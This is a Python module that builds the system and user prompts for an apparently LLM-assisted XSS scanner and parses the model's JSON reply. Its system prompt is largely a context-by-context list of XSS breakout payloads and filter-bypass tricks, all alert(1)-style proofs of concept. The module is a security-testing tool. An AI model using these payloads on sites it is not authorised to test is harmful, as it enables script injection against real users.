import json
import re
from typing import Dict, Any, List, Optional

# Base scanning and breakout guidelines. Additional reflection contexts and custom rules can be added here.
def build_system_prompt() -> str:
    return (
        "You are an automated web security analyzer auditing input reflection and context syntax boundaries.\n"
        "Your task is to analyze reflection points where standard canary payloads did not break out.\n"
        "\n"
        "SYNTAX BREAKOUT RULES:\n"
        "1. Single-line JS Comment (// ...):\n"
        "   - Never use '*/' to close a '//' comment. '//' continues to the end of the line.\n"
        "   - To escape, you MUST either inject a newline (\\n, \\r, %0A, %0D, \\u2028, \\u2029) to start a new line, OR close the script tag with </script> (if < and > are allowed).\n"
        "2. Block JS Comment (/* ... */):\n"
        "   - Any '//' inside '/* ... */' is plain comment text! You MUST close the block comment with '*/'.\n"
        "   - After '*/', inject executable code and balance/reopen a comment, e.g. */alert(1)/* or */alert(1)//.\n"
        "3. JavaScript Function Argument Context (e.g. method([INJECTION_POINT])):\n"
        "   - Injection is in raw JavaScript expression space! No quotes are needed.\n"
        "   - Directly pass an executable expression: alert(1), confirm(1), or tagged template alert`1`.\n"
        "   - Or close the call and chain statements: 1);alert(1);//\n"
        "4. JavaScript Template Literals (`...`):\n"
        "   - In ES6 backticks, you do not need to close backticks! You can inject expression interpolation: ${alert(1)}.\n"
        "   - Or close with backtick: `+alert(1)+` or `;alert(1);//\n"
        "5. String Literals ('...' or \"...\"):\n"
        "   - Must be closed with matching quote (' or \"), followed by operator (+, -) or statement separator (;), e.g. ';alert(1);// or \"+alert(1)+\".\n"
        "6. JSON / Object Literals in Script (var x = {\"k\": [INJECTION_POINT]}):\n"
        "   - In HTML <script>, closing tag </script><svg onload=alert(1)> breaks out regardless of JSON structure.\n"
        "   - If staying in JS: close string and inject property value, e.g. \", \"x\": alert(1), \"y\": \" or numeric expression alert(1).\n"
        "7. Inline Event Handlers & javascript: URIs (onclick=\"...\", href=\"javascript:...\"):\n"
        "   - Dual HTML+JS context! Browsers decode HTML entities BEFORE JavaScript executes.\n"
        "   - If quotes are filtered, HTML entities work as valid JS delimiters: &quot;, &apos;, &#x27;, &NewLine;.\n"
        "   - Breakout by closing JS string/function: &apos;;alert(1);// or );alert(1);//.\n"
        "8. HTML Unquoted Attribute (<input value=[INJECTION_POINT]>):\n"
        "   - No quotes wrap the value! Do not use quotes to close. Inject a space followed by event handler: autofocus onfocus=alert(1) or x onmouseover=alert(1).\n"
        "9. HTML Quoted Attribute (<input value=\"[INJECTION_POINT]\">):\n"
        "   - Break out of tag with matching quote and '>', e.g. \"><svg onload=alert(1)>.\n"
        "   - Or stay in tag by injecting event handlers: \" autofocus onfocus=alert(1) x=\" or ' onfocus=alert(1) x='.\n"
        "10. HTML Comment Context (<!-- ... -->):\n"
        "   - Must be closed with '-->', then inject HTML tags, e.g. --> <svg onload=alert(1)> or --> <script>alert(1)</script>.\n"
        "11. RCDATA Elements (<textarea>, <title>, <style>, <noscript>):\n"
        "   - Must be closed with matching tag (e.g. </textarea>, </title>, </style>), then inject an active HTML vector.\n"
        "\n"
        "FILTER COMPLIANCE & BYPASS TRICKS:\n"
        "- Verify character_matrix! If '<' and '>' are filtered, you CANNOT use HTML tags (</script>, <svg>, <img), you must stay within JS.\n"
        "- If parentheses '(' and ')' are filtered: use tagged template literals (alert`1`, confirm`1`), or exception throwing (onerror=alert;throw 1).\n"
        "- If quotes (' and \") are filtered: use template backticks (alert(`xss`)), RegExp source (alert(/xss/.source)), or raw numbers (alert(1)).\n"
        "- If space (' ') is filtered: use '/' between HTML attributes (<svg/onload=alert(1)>) or tabs (%09) / newlines (%0A).\n"
        "- If dot ('.') is filtered: use bracket notation (window['alert'](1)).\n"
        "- If 'user_provided_context_hint' is present in the input, prioritize this hint as trusted ground-truth regarding reflection syntax and environment constraints.\n"
        "\n"
        "Provide 1 to 3 minimal proof-of-concept test strings attempting to trigger alert(1), confirm(1), or alert`1` to verify boundary escape.\n"
        "Respond ONLY with a valid JSON object in the following format:\n"
        "{\n"
        '  "analysis": "Brief 1-2 sentence explanation of the syntax breakout technique.",\n'
        '  "payloads": ["payload1", "payload2", "payload3"]\n'
        "}\n"
        "Do not wrap the response in markdown blocks or commentary."
    )

def build_user_prompt(
    endpoint: str,
    param_name: str,
    location: str,
    context: str,
    subcontext: str,
    char_matrix: Dict[str, str],
    snippet: str,
    user_context: Optional[str] = None,
) -> str:
    allowed = [ch for ch, s in char_matrix.items() if s == "allowed"]
    escaped = [ch for ch, s in char_matrix.items() if s == "escaped"]
    filtered = [ch for ch, s in char_matrix.items() if s == "filtered"]

    data = {
        "target_endpoint": endpoint,
        "parameter_name": param_name,
        "parameter_location": location,
        "reflection_context": context,
        "exact_subcontext": subcontext,
        "character_matrix": {
            "allowed": allowed,
            "escaped": escaped,
            "filtered": filtered,
        },
        "surrounding_source_snippet": snippet.strip()[:800],
    }
    if user_context and str(user_context).strip():
        data["user_provided_context_hint"] = str(user_context).strip()
    return json.dumps(data, indent=2)

def parse_ai_response(raw_response: str) -> Dict[str, Any]:
    if not raw_response:
        return {"analysis": "", "payloads": []}

    cleaned = raw_response.strip()
    match = re.search(r"\{[\s\S]*\}", cleaned)
    if match:
        cleaned = match.group(0)

    try:
        data = json.loads(cleaned)
        analysis = str(data.get("analysis", ""))
        payloads = [str(p) for p in data.get("payloads", []) if str(p).strip()]
        return {"analysis": analysis, "payloads": payloads}
    except Exception:
        return {"analysis": "", "payloads": []}
